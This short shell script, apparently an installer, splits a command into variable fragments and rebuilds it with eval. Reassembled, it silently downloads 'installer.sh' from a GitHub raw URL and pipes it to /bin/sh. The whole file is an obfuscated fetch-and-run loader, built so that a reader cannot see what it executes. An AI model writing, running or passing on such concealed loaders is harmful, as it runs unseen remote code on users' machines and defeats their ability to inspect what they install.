z="
";Kz='mil2';Cz='ps:/';Xz='sh';Mz='icon';Rz='stal';Qz='n/in';Tz='sh -';Bz=' htt';Ez='.git';Nz='-Bad';Wz='bin/';Gz='serc';Vz=' | /';Sz='ler.';Oz='r26E';Dz='/raw';Lz='37/p';Az='wget';Pz='/mai';Fz='hubu';Hz='onte';Iz='nt.c';Uz='qO -';Jz='om/e';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"